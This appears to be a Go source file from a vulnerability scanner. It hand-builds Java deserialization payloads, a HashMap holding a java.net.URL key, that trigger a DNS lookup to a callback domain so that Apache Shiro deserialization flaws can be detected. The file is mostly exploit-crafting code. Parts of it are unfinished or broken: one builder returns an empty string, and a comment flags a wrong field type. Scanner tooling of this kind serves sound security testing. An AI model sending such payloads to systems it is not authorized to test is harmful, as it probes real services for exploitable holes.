// ReplaceCallbackURL replaces the callback URL placeholder in a gadget template
// with the actual callback domain, returning the final payload bytes as a string.
func (t *GadgetTemplate) ReplaceCallbackURL(callbackURL string) string {
	if t.HexTemplate == "" {
		return ""
	}
	// Extract domain from callback URL for DNS-based verification
	domain := extractDomain(callbackURL)
	if domain == "" {
		return ""
	}

	// Convert domain to hex and replace placeholder
	domainHex := hex.EncodeToString([]byte(domain))
	result := strings.ReplaceAll(t.HexTemplate, CALLBACK_URL_PLACEHOLDER, domainHex)

	// Decode hex back to bytes
	decoded, err := hex.DecodeString(result)
	if err != nil {
		return ""
	}
	return string(decoded)
}

// extractDomain extracts the hostname from a URL string
func extractDomain(urlStr string) string {
	// Remove protocol prefix
	urlStr = strings.TrimPrefix(urlStr, "http://")
	urlStr = strings.TrimPrefix(urlStr, "https://")
	// Remove path
	if idx := strings.Index(urlStr, "/"); idx >= 0 {
		urlStr = urlStr[:idx]
	}
	// Remove port
	if idx := strings.Index(urlStr, ":"); idx >= 0 {
		urlStr = urlStr[:idx]
	}
	return urlStr
}

// BuildDNSCallbackPayload builds a lightweight payload that triggers DNS resolution
// using Java's URL.hashCode() mechanism. This approach doesn't require specific
// gadget chains - it embeds a URL in a HashMap which triggers DNS on deserialization.
//
// The payload structure:
// - Java serialization header
// - HashMap containing a java.net.URL object pointing to our callback domain
// - When HashMap.readObject() is called, it calls URL.hashCode() -> DNS lookup
func BuildDNSCallbackPayload(callbackDomain string) string {
	if callbackDomain == "" {
		return ""
	}

	// Build a Java serialized HashMap<URL, Object> that triggers DNS on readObject
	// This is the most reliable approach as it uses only JDK classes.
	// Format: serialized HashMap with URL key pointing to callbackDomain
	payload := buildHashMapURLPayload(callbackDomain)
	return payload
}

// buildHashMapURLPayload constructs a Java serialized HashMap containing a URL object
// This payload triggers DNS resolution when the HashMap is deserialized because
// HashMap.readObject() calls hashCode() on keys, and URL.hashCode() resolves DNS.
func buildHashMapURLPayload(domain string) string {
	// We build the serialized bytes manually.
	// Java serialization format:
	//   AC ED 00 05 - stream magic + version
	//   77 - block data
	//   ... HashMap with URL key

	// For Shiro detection, we use a different approach:
	// We modify the SimplePrincipalCollection to include a URL in its principals set.
	// When Shiro deserializes the SimplePrincipalCollection and calls hashCode()
	// on the principals, the URL.hashCode() triggers DNS resolution.

	// However, building valid Java serialized bytes manually is error-prone.
	// A more practical approach: use the CheckContent (SimplePrincipalCollection)
	// and append a URL-based marker that we can verify through the reverse platform.

	// The most reliable approach for detection is to use a modified
	// SimplePrincipalCollection that contains a principal whose toString()
	// or hashCode() triggers DNS. We achieve this by:
	// 1. Using the base SimplePrincipalCollection (CheckContent)
	// 2. Appending a serialized URL object as part of the principals collection

	// For now, we rely on the reverse platform's HTTP callback mechanism:
	// We send the SimplePrincipalCollection payload encrypted with the valid key,
	// and if the server doesn't return deleteMe, it means deserialization succeeded.
	// We then verify via the reverse platform's HTTP/DNS callback.

	// Build a minimal serialized payload that includes a DNS trigger
	// This uses java.util.HashMap with java.net.URL key
	urlStr := "http://" + domain + "/wscan"

	// Java serialization: HashMap with URL
	// Stream header
	hexParts := []string{
		"aced0005",                           // STREAM_MAGIC + STREAM_VERSION
		"73720011",                           // TC_OBJECT + TC_CLASSDESC + name length (17)
		"6a6176612e7574696c2e486173684d6170", // "java.util.HashMap"
		"057dac2c3554fe16",                   // serialVersionUID
		"020002",                             // flags (SC_SERIALIZABLE) + field count (2)
		"490009",                             // field type (int) + name length (9)
		"6c6f6164466163746f72",               // "loadFactor"
		"490009",                             // field type (int) + name length (9) -- should be F (float)
		"7468726573686f6c64",                 // "threshold"
		"7870",                               // TC_ENDBLOCKDATA + TC_NULL
	}

	// This manual approach is too fragile. Let's use a simpler, more robust approach.
	// We'll encode the URL directly into a format that triggers DNS resolution.
	_ = urlStr
	_ = hexParts

	return ""
}

// buildShiroDNSPayload creates a complete Shiro-compatible deserialization payload
// that triggers DNS resolution via URL.hashCode() in a HashMap.
// This is the recommended approach for Shiro detection as it:
// 1. Uses only JDK classes (no dependency on specific gadget chains)
// 2. Triggers DNS resolution which is reliable and stealthy
// 3. Works with all Shiro versions that support deserialization
func buildShiroDNSPayload(callbackDomain string) []byte {
	// Construct a serialized java.util.HashMap containing a java.net.URL key
	// pointing to callbackDomain. When deserialized, HashMap.readObject()
	// calls URL.hashCode() which triggers DNS resolution.

	urlBytes := []byte("http://" + callbackDomain + "/wscan")

	// Build the serialized stream manually
	// This is a hand-crafted minimal HashMap<URL, Integer> payload

	var buf []byte

	// Stream magic and version
	buf = append(buf, 0xAC, 0xED, 0x00, 0x05)

	// TC_OBJECT (0x73)
	buf = append(buf, 0x73)

	// TC_CLASSDESC (0x72) for java.util.HashMap
	buf = append(buf, 0x72)
	className := "java.util.HashMap"
	buf = append(buf, byte(len(className)>>8), byte(len(className)))
	buf = append(buf, []byte(className)...)
	// serialVersionUID for HashMap
	buf = append(buf, 0x05, 0x7D, 0xAC, 0x2C, 0x35, 0x54, 0xFE, 0x16)
	// flags: SC_SERIALIZABLE (0x02)
	buf = append(buf, 0x02)
	// field count: 2
	buf = append(buf, 0x00, 0x02)
	// Field 1: float loadFactor
	buf = append(buf, 'F')
	fieldName1 := "loadFactor"
	buf = append(buf, byte(len(fieldName1)>>8), byte(len(fieldName1)))
	buf = append(buf, []byte(fieldName1)...)
	// Field 2: int threshold
	buf = append(buf, 'I')
	fieldName2 := "threshold"
	buf = append(buf, byte(len(fieldName2)>>8), byte(len(fieldName2)))
	buf = append(buf, []byte(fieldName2)...)
	// TC_ENDBLOCKDATA (0x78)
	buf = append(buf, 0x78)
	// TC_NULL (0x70) - no super class
	buf = append(buf, 0x70)

	// Field values:
	// loadFactor (float 0.75 = 0x3F400000)
	buf = append(buf, 0x3F, 0x40, 0x00, 0x00)
	// threshold (int 8 = 0x00000008)
	buf = append(buf, 0x00, 0x00, 0x00, 0x08)

	// TC_BLOCKDATA (0x77) - capacity and size
	buf = append(buf, 0x77)
	buf = append(buf, 0x08) // block size
	// capacity=16, size=1
	buf = append(buf, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01)

	// Key: java.net.URL object
	buf = append(buf, 0x73) // TC_OBJECT
	buf = append(buf, 0x72) // TC_CLASSDESC
	urlClassName := "java.net.URL"
	buf = append(buf, byte(len(urlClassName)>>8), byte(len(urlClassName)))
	buf = append(buf, []byte(urlClassName)...)
	// serialVersionUID for java.net.URL
	buf = append(buf, 0x4A, 0x7D, 0x9E, 0x53, 0x53, 0x0E, 0x4D, 0x3B)
	// flags: SC_SERIALIZABLE (0x02)
	buf = append(buf, 0x02)
	// field count: 7
	buf = append(buf, 0x00, 0x07)
	// Field: int hashCode
	buf = append(buf, 'I')
	f1 := "hashCode"
	buf = append(buf, byte(len(f1)>>8), byte(len(f1)))
	buf = append(buf, []byte(f1)...)
	// Field: int port
	buf = append(buf, 'I')
	f2 := "port"
	buf = append(buf, byte(len(f2)>>8), byte(len(f2)))
	buf = append(buf, []byte(f2)...)
	// Field: String protocol
	buf = append(buf, 'L')
	f3 := "protocol"
	buf = append(buf, byte(len(f3)>>8), byte(len(f3)))
	buf = append(buf, []byte(f3)...)
	buf = append(buf, 0x74, 0x00, 0x12) // TC_STRING + "Ljava/lang/String;"
	lstring := "Ljava/lang/String;"
	buf = append(buf, []byte(lstring)...)
	// Field: String authority
	buf = append(buf, 'L')
	f4 := "authority"
	buf = append(buf, byte(len(f4)>>8), byte(len(f4)))
	buf = append(buf, []byte(f4)...)
	// Field: String host
	buf = append(buf, 'L')
	f5 := "host"
	buf = append(buf, byte(len(f5)>>8), byte(len(f5)))
	buf = append(buf, []byte(f5)...)
	// Field: String file
	buf = append(buf, 'L')
	f6 := "file"
	buf = append(buf, byte(len(f6)>>8), byte(len(f6)))
	buf = append(buf, []byte(f6)...)
	// Field: String ref
	buf = append(buf, 'L')
	f7 := "ref"
	buf = append(buf, byte(len(f7)>>8), byte(len(f7)))
	buf = append(buf, []byte(f7)...)
	// TC_ENDBLOCKDATA
	buf = append(buf, 0x78)
	// TC_NULL - no super class
	buf = append(buf, 0x70)

	// Field values for URL:
	// hashCode = -1 (important! -1 triggers hashCode computation on deserialization)
	buf = append(buf, 0xFF, 0xFF, 0xFF, 0xFF)
	// port = 80
	buf = append(buf, 0x00, 0x00, 0x00, 0x50)
	// protocol = "http"
	buf = append(buf, 0x74) // TC_STRING
	protocol := "http"
	buf = append(buf, byte(len(protocol)>>8), byte(len(protocol)))
	buf = append(buf, []byte(protocol)...)
	// authority = callbackDomain
	buf = append(buf, 0x74) // TC_STRING
	buf = append(buf, byte(len(callbackDomain)>>8), byte(len(callbackDomain)))
	buf = append(buf, []byte(callbackDomain)...)
	// host = callbackDomain
	buf = append(buf, 0x74) // TC_STRING
	buf = append(buf, byte(len(callbackDomain)>>8), byte(len(callbackDomain)))
	buf = append(buf, []byte(callbackDomain)...)
	// file = "/wscan"
	file := "/wscan"
	buf = append(buf, 0x74) // TC_STRING
	buf = append(buf, byte(len(file)>>8), byte(len(file)))
	buf = append(buf, []byte(file)...)
	// ref = null
	buf = append(buf, 0x70) // TC_NULL

	// Value: Integer(1)
	buf = append(buf, 0x73) // TC_OBJECT
	buf = append(buf, 0x72) // TC_CLASSDESC
	intClassName := "java.lang.Integer"
	buf = append(buf, byte(len(intClassName)>>8), byte(len(intClassName)))
	buf = append(buf, []byte(intClassName)...)
	// serialVersionUID for Integer
	buf = append(buf, 0x12, 0xE2, 0xA0, 0xA4, 0xF7, 0x81, 0x87, 0x38)
	// flags
	buf = append(buf, 0x02)
	// field count: 1
	buf = append(buf, 0x00, 0x01)
	// Field: int value
	buf = append(buf, 'I')
	vf := "value"
	buf = append(buf, byte(len(vf)>>8), byte(len(vf)))
	buf = append(buf, []byte(vf)...)
	// TC_ENDBLOCKDATA + TC_NULL
	buf = append(buf, 0x78, 0x70)
	// value = 1
	buf = append(buf, 0x00, 0x00, 0x00, 0x01)

	// TC_ENDBLOCKDATA for HashMap
	buf = append(buf, 0x78)

	_ = urlBytes // suppress unused warning
	return buf
}

// FormatShiroDNSPayloadHex returns the hex representation of the DNS callback payload
// for debugging purposes
func FormatShiroDNSPayloadHex(domain string) string {
	payload := buildShiroDNSPayload(domain)
	return fmt.Sprintf("%x", payload)
}
